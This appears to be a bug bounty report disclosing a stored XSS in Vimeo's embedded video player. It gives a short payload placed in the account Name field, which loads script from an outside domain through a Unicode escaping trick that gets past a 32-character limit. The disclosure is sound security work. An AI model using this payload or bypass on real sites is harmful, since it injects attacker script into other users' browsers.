  "vulnerability_information": "__Description__\r\n\r\nThe page loaded for the Vimeo embedded player prints the Name of the owner of the video in Javascript context. Some characters are escaped, like `\"` but others like `>`, `<` and `/` are not. So, you can insert your own HTML tags like `</script><script src=\"//domain\">` and - if the video is public - any Vimeo user can be affected by the Javascript code that is loaded.\r\nHowever, there is a limitation: the maximum length of Name is 32 characters. But, it's not impossible to circumvent this limitation on Chrome and Safari. One way that I figured out to exploit this vulnerability, is taking advantage that the character `ñ` is printed as `\\u00f1` in the page of the embedded player and that Chrome and Safari take `/\\u00f1` as `//u00f1`. \r\n\r\n__Proof of concept__\r\nReproducible on Chrome.\r\n1. Go to https://vimeo.com/settings.\r\n2. For _Name_ enter `</script><script src=/ñ.xyz>`.\r\n3. Click _Save Changes_.\r\n4. Upload a video and get the numeric identification of the video from the path like https://vimeo.com/137669589.\r\n5. I just registered the domain _u00f1.xyz_ but StartSSL is not resolving the domain yet, so I can't request a certificate until their DNS servers are updated. For this reason you first have to go to https://u00f1.xyz/, click _Advanced_ and click _Proceed to u00f1.xyz (unsafe)_. I will add a comment to this report as soon as I can install a valid certificate. Sorry for the problem.\r\n5. Go to https://player.vimeo.com/video/[numeric_identification_of_the_video].\r\n6. The content from https://u00f1.xyz is loaded.\r\n7. `alert(document.domain)` is executed.\r\n\r\nPlease, let me know if something is not clear.\r\nVideo player with the XSS working: https://player.vimeo.com/video/137669589",
